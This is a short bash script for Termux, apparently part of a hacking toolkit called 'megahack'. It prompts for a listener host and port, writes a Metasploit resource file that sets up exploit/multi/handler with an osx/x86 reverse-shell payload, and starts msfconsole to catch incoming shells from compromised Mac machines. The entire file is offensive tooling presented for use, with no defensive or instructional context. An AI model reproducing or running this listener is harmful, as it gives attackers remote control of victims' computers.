#!/data/data/com.termux/files/usr/bin/bash
cd $HOME/megahack
rm -rf .d.rc
clear
figlet STARTING | lolcat -t
figlet LISTNER | lolcat -t
echo " "
echo " "
tput setaf 1; echo "INPUT LHOST"
read lhost
tput setaf 1; echo "INTER LISTNER PORT"
read port
echo "use exploit/multi/handler" > .d.rc
echo "set payload osx/x86/shell_reverse_tcp" >> .d.rc
echo "set lhost $lhost" >> .d.rc
echo "set lport $port" >> .d.rc
echo "exploit" >> .d.rc
msfconsole -r .d.rc
clear
cd $HOME/megahack && bash megahack
